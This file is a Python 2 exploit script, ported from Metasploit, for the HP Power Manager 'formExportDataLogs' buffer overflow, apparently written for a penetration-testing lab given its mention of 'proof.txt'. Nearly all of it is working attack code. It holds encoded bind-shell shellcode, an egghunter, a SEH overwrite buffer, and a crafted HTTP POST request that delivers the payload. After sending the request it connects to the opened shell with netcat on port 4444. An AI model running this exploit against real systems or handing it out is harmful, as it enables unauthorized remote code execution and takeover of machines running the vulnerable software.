#!/usr/bin/python

import urllib
import os
import sys
import struct
import time
from socket import *

print "[+]"
print "[+] HP Power Manager 'formExportDataLogs' Buffer Overflow"
print "[+]"
print "[+] A1337an ported from metasploit exploit/windows/http/hp_power_manager_filename"
print "[+]"

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_bind_tcp LPORT=4444  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python


egg="b33fb33f"
buf= egg
buf += "\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x88\x95\xb7\x94\x83\xee\xfc\xe2\xf4\x74\x7d"
buf += "\x35\x94\x88\x95\xd7\x1d\x6d\xa4\x77\xf0\x03\xc5\x87"
buf += "\x1f\xda\x99\x3c\xc6\x9c\x1e\xc5\xbc\x87\x22\xfd\xb2"
buf += "\xb9\x6a\x1b\xa8\xe9\xe9\xb5\xb8\xa8\x54\x78\x99\x89"
buf += "\x52\x55\x66\xda\xc2\x3c\xc6\x98\x1e\xfd\xa8\x03\xd9"
buf += "\xa6\xec\x6b\xdd\xb6\x45\xd9\x1e\xee\xb4\x89\x46\x3c"
buf += "\xdd\x90\x76\x8d\xdd\x03\xa1\x3c\x95\x5e\xa4\x48\x38"
buf += "\x49\x5a\xba\x95\x4f\xad\x57\xe1\x7e\x96\xca\x6c\xb3"
buf += "\xe8\x93\xe1\x6c\xcd\x3c\xcc\xac\x94\x64\xf2\x03\x99"
buf += "\xfc\x1f\xd0\x89\xb6\x47\x03\x91\x3c\x95\x58\x1c\xf3"
buf += "\xb0\xac\xce\xec\xf5\xd1\xcf\xe6\x6b\x68\xca\xe8\xce"
buf += "\x03\x87\x5c\x19\xd5\xfd\x84\xa6\x88\x95\xdf\xe3\xfb"
buf += "\xa7\xe8\xc0\xe0\xd9\xc0\xb2\x8f\x6a\x62\x2c\x18\x94"
buf += "\xb7\x94\xa1\x51\xe3\xc4\xe0\xbc\x37\xff\x88\x6a\x62"
buf += "\xfe\x80\xcc\xe7\x76\x75\xd5\xe7\xd4\xd8\xfd\x5d\x9b"
buf += "\x57\x75\x48\x41\x1f\xfd\xb5\x94\x99\xc9\x3e\x72\xe2"
buf += "\x85\xe1\xc3\xe0\x57\x6c\xa3\xef\x6a\x62\xc3\xe0\x22"
buf += "\x5e\xac\x77\x6a\x62\xc3\xe0\xe1\x5b\xaf\x69\x6a\x62"
buf += "\xc3\x1f\xfd\xc2\xfa\xc5\xf4\x48\x41\xe0\xf6\xda\xf0"
buf += "\x88\x1c\x54\xc3\xdf\xc2\x86\x62\xe2\x87\xee\xc2\x6a"
buf += "\x68\xd1\x53\xcc\xb1\x8b\x95\x89\x18\xf3\xb0\x98\x53"
buf += "\xb7\xd0\xdc\xc5\xe1\xc2\xde\xd3\xe1\xda\xde\xc3\xe4"
buf += "\xc2\xe0\xec\x7b\xab\x0e\x6a\x62\x1d\x68\xdb\xe1\xd2"
buf += "\x77\xa5\xdf\x9c\x0f\x88\xd7\x6b\x5d\x2e\x57\x89\xa2"
buf += "\x9f\xdf\x32\x1d\x28\x2a\x6b\x5d\xa9\xb1\xe8\x82\x15"
buf += "\x4c\x74\xfd\x90\x0c\xd3\x9b\xe7\xd8\xfe\x88\xc6\x48"
buf += "\x41"

#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

hunter =  ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "\x41" * (721 -len(hunter))
buffer +="\x90"*30 + hunter
buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
 

content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
payload += "Host: %s\r\n" % HOST
payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
payload += "Accept: %s\r\n" % buf
payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
payload += "Content-Type: application/x-www-form-urlencoded\r\n"
payload += "Content-Length: %s\r\n\r\n" % len(content)
payload += content

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print "[+] Payload fired...be back in less than a minute..."
s.send(payload)
print "[+] give me 30 sec!"
time.sleep(30)
os.system("nc -nv " + HOST +" 4444")
s.close()
print "[+] Did you get your proof.txt key ?!?"
#note if you didn't get a bindshell, you may have to bump it to a minute time.sleep(60).

